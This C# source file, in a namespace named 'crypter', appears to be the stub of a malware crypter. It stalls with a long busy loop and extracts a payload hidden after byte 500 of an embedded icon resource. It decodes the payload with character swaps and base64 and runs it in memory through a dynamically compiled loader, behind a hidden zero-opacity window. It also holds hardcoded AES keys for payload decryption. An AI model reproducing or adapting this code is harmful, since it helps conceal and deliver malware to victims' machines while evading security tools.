using System;
using System.Collections.Generic;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.CodeDom.Compiler;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.CSharp;
using System.Runtime.InteropServices;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Windows.Forms;
 
namespace crypter
{
    public static class other
    {
        //[DllImport("kernel32.dll")]
        //static extern bool FreeConsole();
        public static List<string> codebase3 = new List<string>();
 
        [STAThread]
        static void Main(string[] args)
        {
 
             
             
            List<string> codebase = new List<string>();
            int s = 0;
            for (int d = 0; d < 5000000; d++)
            {
                int x = 1;
                int y = x;
                y++;
                s = y;
            }
 
 
            List<string> codebase2 = new List<string>();
 
            {
                var assembly = Assembly.GetExecutingAssembly();
                string[] a = assembly.GetManifestResourceNames();
 
 
                foreach (var item in a)
                {
                    Console.WriteLine(item);
                }
            }
             
             
             
            int size = 0;
 
            {
                var assembly = Assembly.GetExecutingAssembly();
                var resourceName = "size.txt";
 
                using (Stream stream = assembly.GetManifestResourceStream(resourceName))
                using (StreamReader reader = new StreamReader(stream))
                {
                    string result = "";
 
                    for (int i = 0; i < stream.Length; i++)
                    {
                        result += ((char)stream.ReadByte());
                    }
 
                    size = Convert.ToInt32(result);
                    //Console.WriteLine("size: "+size);
                }
 
            }
             
            string image = "";
 
            {
                var assembly = Assembly.GetExecutingAssembly();
 
                var resourceName = "image.ico";
 
                using (Stream stream = assembly.GetManifestResourceStream(resourceName))
                using (StreamReader reader = new StreamReader(stream))
                {
                    //Console.WriteLine((stream.Length));
                    for (int i = 0; i < stream.Length; i++)
                    {
                        if (i >= (size + 500))
                        {
                            break;
                        }
                        if (i >= 500)
                        {
                            image += ((char)stream.ReadByte());
                             
                        }
                        else stream.ReadByte();
                    }
                }
 
            }
             
 
 
            Decrypt(image, args);
 
 
            try
            {
                Application.EnableVisualStyles();
                Application.SetCompatibleTextRenderingDefault(false);
                Form dasd = new Form1();
 
                dasd.StartPosition = FormStartPosition.CenterScreen;
                dasd.MinimizeBox = false;
                dasd.WindowState = FormWindowState.Minimized;
                dasd.ShowInTaskbar = false;
                dasd.Opacity = 0;
                Application.Run(dasd);
            }
            catch (Exception e) { MessageBox.Show(e.Message); }
 
 
        }
         
        static readonly string PasswordHash = "P@@Sw0rd";
        static readonly string SaltKey = "S@LT&KEY";
        static readonly string VIKey = "@1B2c3D4e5F6g7H8";
        static readonly string MTExp = "48BRN3o23IOP";
        public static string Decrypet(string encryptedText)
        {
            byte[] cipherTextBytes = Convert.FromBase64String(encryptedText);
            byte[] keyBytes = new Rfc2898DeriveBytes(PasswordHash, Encoding.ASCII.GetBytes(SaltKey)).GetBytes(256 / 8);
            var symmetricKey = new RijndaelManaged() { Mode = CipherMode.CBC, Padding = PaddingMode.None };
 
            var decryptor = symmetricKey.CreateDecryptor(keyBytes, Encoding.ASCII.GetBytes(VIKey));
            var memoryStream = new MemoryStream(cipherTextBytes);
            var cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read);
            byte[] plainTextBytes = new byte[cipherTextBytes.Length];
 
            int decryptedByteCount = cryptoStream.Read(plainTextBytes, 0, plainTextBytes.Length);
            memoryStream.Close();
            cryptoStream.Close();
            return Encoding.UTF8.GetString(plainTextBytes, 0, decryptedByteCount).TrimEnd("\0".ToCharArray());
        }
 
        static void Decrypt(string f, string[] args)
        {
            //String lol = System.Text.Encoding.ASCII.GetString(File.ReadAllBytes("DTA32.HF"));
 
            //f = Decrypet(f);
            byte[] binaryData = Convert.FromBase64String(f.Replace("%", "A").Replace("$", "A").Replace("#", "B").Replace("&", "C"));
            Thread a = new Thread(() => RunFromMemory(binaryData, args));
            a.ApartmentState = ApartmentState.STA;
            a.Start();
        }
 
        static string[] GetCode()
        {
            return new string[]
            {
                @"using System;
                 using System.Collections.Generic;
                 using System.Reflection;
                 using System.Runtime.CompilerServices;
                 using System.Text;
                 using Microsoft.CSharp;
                 using System.CodeDom.Compiler;
                 using System.Threading;
                 using System.Threading.Tasks;
             
                namespace ABC.TestXXX 
                {
                    public class MyClass
                    {
                        public void Run(byte[] bytes, string[] args)
                        {
 
                            Assembly assembly = Assembly.Load(bytes);
                            MethodInfo entryPoint = assembly.EntryPoint;
                            object objectValue = RuntimeHelpers.GetObjectValue(assembly.CreateInstance(entryPoint.Name));
                            entryPoint.Invoke(RuntimeHelpers.GetObjectValue(objectValue), new Object[] {  args  });
                        }
                        public string codeBaser(List<string> codebase, List<string> codebase2, List<string> codebase3)
                        {
                            string huu = """";
 
                            for (int i = 0; i < codebase.Count+200; i++)
                            {
                 
                                if(codebase.Count > i) huu += codebase[i];
                                if(codebase2.Count > i) huu += codebase2[i];
                                if(codebase3.Count > i) huu += codebase3[i];
 
                            }
                            return huu;
                        }
                    } 
 
                    
                } 
            "
            };
        }
 
        public static void fillBase3()
        {
            //<CODE3>
 
        }
        public static void RunFromMemory(byte[] bytes, string[] args)
        {
 
 
 
            CompileCSharpCode(GetCode(), bytes, args);
             
 
        }
 
 
 
        public static bool CompileCSharpCode(string[] sourceFile, byte[] bytes, string[] args)
        {
            CSharpCodeProvider provider = new CSharpCodeProvider();
 
            CompilerParameters cp = new CompilerParameters();
            cp.ReferencedAssemblies.Add("System.dll");
            cp.GenerateExecutable = false;
            cp.GenerateInMemory = true;
 
            CompilerResults cr = provider.CompileAssemblyFromSource(cp, sourceFile);
 
            Assembly _B_ = cr.CompiledAssembly;
            object YY = _B_.CreateInstance("ABC.TestXXX.MyClass");
 
            YY.GetType().GetMethod("Run").Invoke(YY, new object[] { bytes, args });
            return true;
 
        }
    }
 
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
 
        private void Form1_Load(object sender, EventArgs e)
        {//pass1234567
            richTextBox1.Text += "fdsfsdfsd\n";
        }
 
 
    }
 
    partial class Form1
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;
 
        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }
 
        #region Windows Form Designer generated code
 
        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            var assembly = Assembly.GetExecutingAssembly();
 
            var resourceName = "image.ico";
            byte[] image = new byte[2];
            using (Stream stream = assembly.GetManifestResourceStream(resourceName))
            using (StreamReader reader = new StreamReader(stream))
            {
                image = new byte[stream.Length];
                //Console.WriteLine((stream.Length));
                for (int i = 0; i < stream.Length; i++)
                {
                        image[i] = ((byte)stream.ReadByte());
                }
            }
            MemoryStream mStream = new MemoryStream();
            byte[] pData = image;
            mStream.Write(pData, 0, Convert.ToInt32(pData.Length));
            Bitmap bm = new Bitmap(mStream, false);
            mStream.Dispose();
 
 
            //System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
            this.richTextBox1 = new System.Windows.Forms.RichTextBox();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.SuspendLayout();
            // 
            // richTextBox1
            // 
            this.richTextBox1.Location = new System.Drawing.Point(12, 12);
            this.richTextBox1.Name = "richTextBox1";
            this.richTextBox1.Size = new System.Drawing.Size(260, 238);
            this.richTextBox1.TabIndex = 0;
            this.richTextBox1.Text = "";
            // 
            // pictureBox1
            // 
            this.pictureBox1.Location = new System.Drawing.Point(312, 13);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Image = ((System.Drawing.Image)(bm));
            this.pictureBox1.Size = new System.Drawing.Size(100, 50);
            this.pictureBox1.TabIndex = 1;
            this.pictureBox1.TabStop = false;
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(663, 262);
            this.Controls.Add(this.pictureBox1);
            this.Controls.Add(this.richTextBox1);
            this.Name = "Form1";
            this.Text = "Form1";
            this.Load += new System.EventHandler(this.Form1_Load);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.ResumeLayout(false);
 
        }
 
        #endregion
 
        private System.Windows.Forms.RichTextBox richTextBox1;
        private System.Windows.Forms.PictureBox pictureBox1;
    }
 
}
